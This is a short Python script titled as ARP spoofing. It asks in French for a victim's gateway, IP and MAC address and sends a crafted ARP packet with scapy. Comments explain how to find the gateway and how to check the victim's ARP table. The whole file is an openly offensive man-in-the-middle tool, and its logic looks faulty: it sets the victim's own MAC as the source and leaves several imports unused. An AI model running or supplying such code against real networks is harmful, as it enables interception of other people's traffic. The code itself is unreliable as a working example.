#!/usr/bin/env python
# malorybergezcasalou
# script arp spoofing

import scapy.all as scapy
import sys
import os
import datetime
import threading

def spoof():
    # "ip r s" to know the gateway
    
    addressGateway = input("entrez la passerelle de la victime : ")
    addressIpVictim = input("entrez l'adresse ip de la victime : ")
    addressMacVictim = input("entrez l'adresse mac de la victime : ")
    
    packet = scapy.srp(scapy.ARP(pdst=addressGateway, psrc=addressIpVictim, hwsrc=addressMacVictim))


spoof()

# "ip n show" on victim to view the arp table 
